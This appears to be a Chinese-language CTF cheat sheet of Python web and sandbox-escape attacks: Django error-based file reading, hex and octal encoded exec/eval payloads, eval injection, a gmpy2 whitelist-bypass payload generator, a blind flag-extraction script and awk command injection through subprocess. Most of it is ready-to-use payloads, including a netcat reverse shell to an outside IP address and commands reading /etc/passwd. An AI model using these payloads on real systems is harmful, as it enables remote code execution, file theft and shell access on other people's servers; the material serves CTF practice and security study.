## **python沙箱逃逸执行危险函数**
<https://blog.csdn.net/Jayjay___/article/details/132436072>

^
## **Django报错**
Django获取字符参数，如果传入的值是%80以上，则会报错，爆出路径等信息，如果是sqllite还会爆出sqllite数据库文件。
```
如：?url=%80
%81
%FF
```
如果一个后端是php是使用curl请求一个django程序，那么可以
```
?url=@一个本地文件路径
实现curl传文件
而django正好不能处理这个文件中的字符，就会报错回显这个文件的内容
实现文件读取
?url=@/opt/api/api/settings.py
?url=@/opt/api/database.sqlite3
```



^
## **十六进制编码**
十六进制编码在Python字符串中是合法的，因为它是Python语言规范的一部分。当Python解释器读取到这样的编码时，它会将十六进制数转换成对应的字符。
```
\x28\x29
```
## **八进制编码**
有时也用八进制编码绕过
```
exec("print('RCE');__import__('os').system('ls')")
exec("\160\162\151\156\164\050\047\122\103\105\047\051\054\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\154\163\047\051")

eval用,分离代码。
eval("print('RCE'),__import__('os').system('ls')")
eval("\160\162\151\156\164\050\047\122\103\105\047\051\054\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\154\163\047\051")
```
```
user = request.cookies.get("user")
    if user.lower() == 'adm;n':

Cookie: user="adm\073n";
```

^
## **eval()函数利用**
python报错后显示了代码：eval(a + operator + b)
```
拼接传参b
/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system('nc 120.46.41.173 9023 -e /bin/sh')
```

```
eval(__import__('os').popen('cat /etc/passwd').read());
eval(__import__('os').popen('cat /f*').read());
```

^
## **eval存在白名单过滤**
eval(code)
要求code存在gmpy2数组中。
```
for item in pattern.findall(code):#从code里把单词拿出来 
if not re.match(r'\d+$',item):#如果不是数字 
if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
```
```
知道gmpy2以下可以命令执行：
gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")

则需要对eval和__import__('os').popen('tac /flag').read()进行内含的数组中绕过
即：
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cot'[2]+'ai'[0]+'cmp'[0]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")

```
生成脚本
```
s="__import__('os').popen('tac /flag').read()"

import gmpy2

payload="gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("

for i in s:
        if i not in "/'(). ":
                temp_index=0
                temp_string='x'*20
                for j in dir(gmpy2):
                        if j.find(i)>=0:
                                if len(j)<len(temp_string):
                                        temp_string=j
                                        temp_index=j.find(i)
                payload+=f'\'{temp_string}\'[{temp_index}]+'
        else:
                payload+=f'\"{i}\"+'

payload=payload[:-1]+')'

print(payload)
```

## **eval存在黑名单过滤**
```
eval(code,{},{'+': 1});
第二三参数是字典，构造即可。

传入的字符串，用'和#注释闭合'
用and连接即可。会执行code
eval('a'+'' and code #')
```
盲注脚本
```
import requests
url="http:///?a=+and+b+in+FLAG%23&b="
s='abcdefghijkmnlopqrstuvwxyzABCDEFGHIJKMNLOPQRSTUVWXYZ0123456789-_{}'
flag='flag{'
for a in range(50):
    for i in s:
        r=requests.get(url=url+flag+i).text
        print(url+flag+i)
        if 'not'  not in r:
            print(flag)
            flag+=i
            break
```


^
^
## **subprocess运行外部命令**
使用了 Python 的 `subprocess` 模块来运行外部命令：
```
cmd: str = request.form.get('cmd')
param: str = request.form.get('param')

tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
```
1. `subprocess.run`: 这是 `subprocess` 模块中的一个函数，用于运行外部命令。
2. `cmd[:3]`: 这是一个列表，包含了外部命令的可执行文件和它的参数。`cmd[:3]` 表示取 `cmd` 列表的前三个元素，可能是外部命令的可执行文件和一些参数。
3. `param`: 这是一个变量，作为外部命令的参数。
4. `__file__`: 这是一个变量，表示当前脚本的文件名。
5. `cwd=os.getcwd()`: 这是 `subprocess.run` 函数的参数，指定了子进程的当前工作目录。`os.getcwd()` 返回当前工作目录。
6. `timeout=5`: 这是 `subprocess.run` 函数的参数，指定了运行外部命令的超时时间，单位是秒。在这里，设置为 5 秒。

cmd是执行的命令，param是执行的参数
可以直接
```
cmd=cat&param=flag.txt
```

python中有一个awk命令，可以执行系统命令，长度刚好为3
格式为：awk '{system("ls")}' 
通过抓包分析，传参方式为post，根据可控参数cmd和param
通过awk构造payload
payload:
```
cmd=awk&param={system("ls")}//查看当前路径下所有文件
cmd=awk&param={system("cat fla*")}//查看fLag文件的内容
```
